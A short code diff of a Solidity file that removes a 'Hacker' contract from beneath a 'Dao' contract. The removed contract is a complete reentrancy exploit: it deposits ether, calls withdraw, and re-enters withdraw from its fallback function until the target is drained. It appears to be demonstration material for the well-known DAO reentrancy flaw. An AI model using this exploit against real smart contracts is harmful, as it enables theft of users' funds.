@@ -34,35 +34,3 @@ contract Dao {
         return address(this).balance;
     }
 }
-
-// ===========================================================================
-
-interface IDao {
-    function withdraw() external ;
-    function deposit()external  payable;
- }
-
-contract Hacker{
-    IDao dao; 
-
-    constructor(address _dao){
-        dao = IDao(_dao);
-    }
-
-    function attack() public payable {
-        require(msg.value >= 1 ether, "Need at least 1 ether to commence attack.");
-        dao.deposit{value: msg.value}();
-
-        dao.withdraw();
-    }
-
-    fallback() external payable{
-        if(address(dao).balance >= 1 ether){
-            dao.withdraw();
-        }
-    }
-
-    function getBalance()public view returns (uint){
-        return address(this).balance;
-    }
-}
